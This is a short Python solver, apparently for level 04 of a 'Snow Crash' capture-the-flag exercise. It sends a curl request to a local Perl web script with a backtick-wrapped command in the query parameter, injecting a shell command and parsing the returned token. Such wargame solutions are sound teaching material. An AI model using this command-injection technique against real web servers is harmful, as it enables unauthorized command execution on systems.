"""LEVEL 04"""

import utils as u
from utils.level_wrapper import level_handler


@level_handler
def solve_level04(_, snow_crash):
    """Inject command via a script running on a web server"""

    output = snow_crash["curl '127.0.0.1:4747/level04.pl?x=`getflag`'"]
    token = u.misc.parse_token(output)
    return "token", token
